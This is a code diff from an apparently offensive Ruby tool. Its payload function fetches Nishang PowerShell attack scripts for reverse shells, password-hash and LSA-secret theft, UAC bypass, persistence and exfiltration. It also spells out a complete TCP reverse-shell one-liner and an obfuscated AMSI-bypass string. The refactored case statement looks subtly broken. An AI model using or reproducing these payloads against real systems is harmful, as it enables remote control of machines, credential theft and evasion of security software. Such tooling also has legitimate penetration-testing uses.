@@ -347,9 +347,38 @@ def getPayload(payload)
 
   base_url = "https://raw.githubusercontent.com/samratashok/nishang/master/"
 
-  if payload == "Invoke-PowerShellTcp"
-    res = HTTParty.get(base_url + "Shells/Invoke-PowerShellTcp.ps1")
-  elsif payload == "Invoke-PowerShellTcpOneLine"
+  nishang_payloads = {
+    'Shells'=> %w[Invoke-PowerShellTcp Invoke-PowerShellUdp Invoke-ConPtyShell],
+
+    'Gather' => %w[Get-Information Get-WLAN-Keys Get-PassHashes Get-LSASecret
+      Copy-VSS Check-VM 
+    ],
+
+    'Scan' => %w[Invoke-PortScan],
+
+    'Escalation' => %w[Invoke-PsUACme Remove-Update],
+
+    'Utility' => %w[Add-Persistence Add-Exfiltration Download Parse_Keys]
+  }
+
+  # store all payloads in flattened array
+  v = []
+
+  nishang_payloads.each_value {|val| v.push val}
+  v.flatten!
+
+  case payload
+  when v.include? payload
+    # find key associated w payload to build req
+    p = ''
+
+    nishang_payloads.each do |key,val|
+      p = "#{key}/#{payload}.ps1" if val.include? payload
+    end 
+
+    res = HTTParty.get(base_url + p)
+    return res.body
+  when "Invoke-PowerShellTcpOneLine"
     print "[*] Reverse shell ip: ".light_blue
     ip = gets.strip
 
@@ -357,51 +386,14 @@ def getPayload(payload)
     port = gets.strip
 
     return "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-
-  elsif payload == "Invoke-PowerShellUdp"
-    res = HTTParty.get(base_url + "Shells/Invoke-PowerShellUdp.ps1")
-  elsif payload == "Invoke-ConPtyShell"
-    res = HTTParty.get(base_url + "Shells/Invoke-ConPtyShell.ps1")
-  elsif payload == "Get-System"
-    res = HTTParty.get("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1")
-  elsif payload == "Get-Information"
-    res = HTTParty.get(base_url + "Gather/Get-Information.ps1")
-  elsif payload == "Get-WLAN-Keys"
-    res = HTTParty.get(base_url + "Gather/Get-WLAN-Keys.ps1")
-  elsif payload == "Get-PassHashes"
-    res = HTTParty.get(base_url + "Gather/Get-PassHashes.ps1")
-  elsif payload == "Get-LSASecret"
-    res = HTTParty.get(base_url + "Gather/Get-LSASecret.ps1")
-  elsif payload == "Copy-VSS"
-    res = HTTParty.get(base_url + "Gather/Copy-VSS.ps1")
-  elsif payload == "Check-VM"
-    res = HTTParty.get(base_url + "Gather/Check-VM.ps1")
-  elsif payload == "Invoke-CredentialsPhish"
-    res = HTTParty.get(base_url + "Gather/Invoke-CredentialsPhish.ps1")
-  elsif payload == "Invoke-PortScan"
-    res = HTTParty.get(base_url + "Scan/Invoke-PortScan.ps1")
-  elsif payload == "Invoke-PsUACme"
-    res = HTTParty.get(base_url + "Escalation/Invoke-PsUACme.ps1")
-  elsif payload == "Remove-Update"
-    res = HTTParty.get(base_url + "Escalation/Remove-Update.ps1")
-  elsif payload == "Add-Persistence"
-    res = HTTParty.get(base_url + "Utility/Add-Persistence.ps1")
-  elsif payload == "Add-Exfiltration"
-    res = HTTParty.get(base_url + "Utility/Add-Exfiltration.ps1")
-  elsif payload == "Download"
-    res = HTTParty.get(base_url + "Utility/Download.ps1")
-  elsif payload == "Parse_Keys"
-    res = HTTParty.get(base_url + "Utility/Parse_Keys.ps1")
-  elsif payload == "Invoke-AmsiBypass"
+  when "Invoke-AmsiBypass" 
     template = "[ReF].\"`A$(" + randCase("echo sse") + ")`mB$(" + randCase("echo L") + ")`Y\".\"g`E$(" + randCase("echo tty") + ")p`E\"(( \"Sy{3}ana{1}ut{4}ti{2}{0}ils\" -f'iUt','gement.A',\"on.Am`s\",'stem.M','oma') ).\"$(" + randCase("echo ge") + ")`Tf`i$(" + randCase("echo El") + ")D\"((\"{0}{2}ni{1}iled\" -f'am','tFa',\"`siI\"),(\"{2}ubl{0}`,{1}{0}\" -f 'ic','Stat','NonP')).\"$(" + randCase("echo Se") + ")t`Va$(" + randCase("echo LUE") + ")\"($(),$(1 -eq 1))"
 
-    return template
+    return template 
   else
     puts "\n[!] Invalid payload".red
-    exit 0
-  end
-
-  return res.body
+    exit 0   
+  end 
 end
 
 def parseArgs()
